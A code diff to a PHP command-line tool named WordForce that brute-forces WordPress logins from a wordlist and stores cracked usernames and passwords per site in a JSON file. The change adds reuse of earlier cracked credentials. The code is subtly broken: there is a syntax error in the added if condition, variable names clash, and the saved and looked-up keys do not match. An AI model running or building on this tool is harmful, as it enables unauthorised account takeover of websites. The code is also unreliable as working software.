@@ -3,7 +3,7 @@
  * WordForce CLI
  *
  * @author Fray117
- * @version 0.3.7
+ * @version 0.3.9
  */
 
 include 'wordforce.php';
@@ -46,13 +46,26 @@ switch ($opt) {
 			$wordlist = file($opts['w']);
 
 			foreach ($wordlist as $key => $password) {
+				if (file_exists('cracked.json')) {
+					$data = json_decode(file_get_contents('cracked.json'));
+					if (isset($data[$url])) {
+
+						if ($wpforce->validate($url, $data[$url]['username'], $data[$url]['password']);) {
+							print '- Already Cracked -' . PHP_EOL;
+							print 'Username: ' . $data[$url]['username'] . PHP_EOL;
+							print 'Password: ' . $data[$url]['password'] . PHP_EOL;
+							exit;
+						}
+					}
+				}
+
 				$cracking = $wf->validate($url, $username, $password);
 
 				if ($cracking) {
 					print '[' . $key  . '] Cracked using ' . $password . PHP_EOL;
 					if (file_exists('cracked.json')) {
 						$data = json_decode(file_get_contents('cracked.json'));
-						$data['user'][$username] = $password;
+						$data['user'][$url] = array('username' => $username, 'password' => $password);
 						$json = json_encode($data);
 						file_put_contents('cracked.json', $json, LOCK_EX);
 					} else {
@@ -77,13 +90,26 @@ switch ($opt) {
 			$wordlist = file($opts['wordlist']);
 
 			foreach ($wordlist as $key => $password) {
+				if (file_exists('cracked.json')) {
+					$data = json_decode(file_get_contents('cracked.json'));
+					if (isset($data[$url])) {
+
+						if ($wpforce->validate($url, $data[$url]['username'], $data[$url]['password']);) {
+							print '- Already Cracked -' . PHP_EOL;
+							print 'Username: ' . $data[$url]['username'] . PHP_EOL;
+							print 'Password: ' . $data[$url]['password'] . PHP_EOL;
+							exit;
+						}
+					}
+				}
+
 				$cracking = $wpforce->validate($url, $username, $password);
 
 				if ($cracking) {
 					print '[' . $key  . '] Cracked using ' . $password . PHP_EOL;
 					if (file_exists('cracked.json')) {
 						$data = json_decode(file_get_contents('cracked.json'));
-						$data['user'][$username] = $password;
+						$data['user'][$url] = array('username' => $username, 'password' => $password);
 						$json = json_encode($data);
 						file_put_contents('cracked.json', $json, LOCK_EX);
 					} else {
